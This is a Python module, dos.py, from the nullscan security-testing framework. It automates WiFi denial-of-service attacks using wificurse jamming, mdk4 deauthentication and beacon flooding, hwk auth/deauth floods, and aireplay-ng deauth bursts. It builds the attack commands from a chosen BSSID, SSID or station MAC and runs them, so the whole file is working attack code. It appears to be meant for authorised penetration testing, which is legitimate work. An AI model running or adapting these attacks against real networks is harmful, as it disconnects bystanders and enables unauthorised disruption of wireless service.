#!/usr/bin/env python3
# -*- coding: utf-8 -*- ########################################################
#               ____                     _ __                                  #
#    ___  __ __/ / /__ ___ ______ ______(_) /___ __                            #
#   / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                            #
#  /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                             #
#                                           /___/ team                         #
#                                                                              #
# nullscan                                                                     #
# A modular framework designed to chain and automate security tests            #
#                                                                              #
# FILE                                                                         #
# dos.py                                                                       #
#                                                                              #
# AUTHOR                                                                       #
# noptrix@nullsecurity.net                                                     #
#                                                                              #
################################################################################


# sys imports


# own imports
from modules.libs.base import Base, tool, timeout
import modules.libs.wifi as wifi


class Dos(Base):
  """ DoS WiFi module """


  def __init__(self, target, opts):
    """ init """

    Base.__init__(self, target, opts)

    return


  @tool
  def wificurse(self):
    """
    DESCR: WiFi Jamming tool. (ext)
    TOOLS: wificurse
    """

    interface = self.target
    tool_name = 'wificurse'

    self._run_tool(tool_name,
      interface,
      timeout=self.opts['wifi_timeout'],
      escape_codes=True
      )

    return


  @tool
  def mdk4(self):
    """
    DESCR: Tool to exploit common IEEE 802.11 protocol weaknesses. (ext)
    TOOLS: mdk4
    """

    kb = wifi.KbWifi(self)
    interface = self.target
    tool_name = 'mdk4'
    bssid = self.opts['bssid']
    sta = self.opts['station_mac']
    ssid = self.opts['ssid']

    if len(sta):
      # station_mac is set, only target that station
      target = kb.targets({'station_mac': sta})
      for s in target['stations']:
        if s.ap is not None:
          # Deauthentication and Disassociation
          self._run_tool(tool_name, f"{interface} d -B {s.ap.essid} -S {s.mac}",
            timeout=self.opts['wifi_timeout'])

      return

    if len(bssid) > 0:
      # bssid is set target all stations that are connected to bssid
      targets = kb.targets({'bssid': bssid})
      for ap in targets['aps']:
        for s in ap.stations:
          # Deauthentication and Disassociation
          self._run_tool(tool_name, f"{interface} d -B {ap.essid} -S {s.mac}",
            timeout=self.opts['wifi_timeout'])

      return

    if len(ssid) > 0:
      # sssid is set target all stations that are connected to sssid
      targets = kb.targets({'ssid': ssid})
      for ap in targets['aps']:
        for s in ap.stations:
          # Deauthentication and Disassociation
          self._run_tool(tool_name, f"{interface} d -B {ap.essid} -S {s.mac}",
            timeout=self.opts['wifi_timeout'])

      return

    # Beacon Flooding
    self._run_tool(tool_name, f"{interface} b",
      timeout=self.opts['wifi_timeout'])

    return

  def __hwk_helper(self, mode):
    """ hwk helper to dry code up """

    kb = wifi.KbWifi(self)
    interface = self.target
    tool_name = 'hawk'
    bssid = self.opts['bssid']
    ssid = self.opts['ssid']
    sta = self.opts['station_mac']
    channel = self.opts['wifi_channel']
    force_flush = 'stdbuf -i 0 -o 0 -e 0 '
    target = None

    def cbkill():
      self._run_cmd(f"pkill --signal SIGINT {tool_name}")

    if (len(bssid) > 0 or len(ssid) > 0) and len(sta) == 0:
      # ap is specified but not station -> attack all connected station
      if len(ssid) > 0:
        target = kb.targets({'ssid': ssid})
      elif len(bssid) > 0:
        target = kb.targets({'bssid': bssid})

    if (len(bssid) > 0 or len(ssid) > 0) and len(sta) > 0:
      # ap and station is specified -> only attack this station if connected
      target = False
    if len(bssid) == 0 and len(ssid) == 0 and len(sta) > 0:
      # only the station is specified -> atack this station and figure out
      # the ap first
      target = kb.targets({'station_mac': sta})

    # auth stress test
    opts = []
    if not target:
      opts.append(f" --iface {interface}" +\
                  f" {mode} --bssid {bssid}" +\
                  f" --client {sta}")
      if len(channel) > 0:
        opts[-1] += f" --channel {channel}"
    else:
      for station in target['stations']:
        if station.ap is not None:
          opts.append(f" --iface {interface} {mode}" +\
                      f" --bssid {station.ap.bssid}" +\
                      f" --client {station.mac}" +\
                      f" --channel {station.ap.channel}")
    for opt in opts:
      self._run_tool(f"{force_flush} {tool_name}", opt, 'hwk',
        timeout=5,
        cbkill=cbkill)

    return


  @tool
  def hwk_auth(self):
    """
    DESCR: 802.11 stress testing tool. Auth Mode (ext)
    TOOLS: hwk-eagle
    """

    self.__hwk_helper('--auth')

    return


  @tool
  def hwk_deauth(self):
    """
    DESCR: 802.11 stress testing tool. Deauth Mode (ext)
    TOOLS: hwk-eagle
    """

    self.__hwk_helper('--deauth')

    return


  @tool
  def aireplay_deauth(self):
    """
    DESCR: Aireplay-ng is used to inject frames. (ext)
    TOOLS: aireplay-ng
    """
    kb = wifi.KbWifi(self)
    interface = self.target
    tool_name = 'aireplay-ng'
    bssid = self.opts['bssid']
    ssid = self.opts['ssid']
    sta = self.opts['station_mac']
    channel = self.opts['wifi_channel']
    target = None

    if len(sta) > 0:
      # station is given, only deauth this station if connected
      target = kb.targets({'station_mac': sta})
    elif len(bssid) > 0 or len(ssid) > 0:
      # ap is given, deauth all connected stations
      target = kb.targets({'bssid': bssid, 'ssid': ssid})
    else:
      # nothing is given, stop here
      return

    # first make sure the interface is set to the right channel
    self._run_tool("airodump-ng", f"{interface} -c {channel}",
      timeout=3,
      create_log=False
      )

    # start the actual deauth
    for station in target['stations']:
      if station.ap is not None:
        opts = f"--deauth 50" +\
               f" -e {station.ap.essid}" +\
               f" -a {station.ap.bssid}" +\
               f" -c {station.mac} {interface}"
        self._run_tool(tool_name, opts, timeout=self.opts['wifi_timeout'])

    return


# EOF
